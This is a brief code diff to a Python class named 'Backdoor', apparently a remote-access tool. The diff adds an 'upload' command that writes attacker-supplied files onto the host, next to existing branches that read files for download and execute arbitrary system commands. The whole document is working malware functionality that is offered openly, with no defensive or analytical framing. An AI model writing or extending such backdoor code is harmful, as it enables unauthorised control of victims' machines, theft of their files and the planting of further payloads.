@@ -139,6 +139,10 @@ class Backdoor:
             elif command[0] == "download" and len(command) > 1:
                 command_result = self.read_file(command[1])
 
+            # write file
+            elif command[0] == "upload" and len(command) > 1:
+                command_result = self.write_file(command[1], command[2])
+
             # execute command
             else:
                 command_result = self.execute_system_command(command)
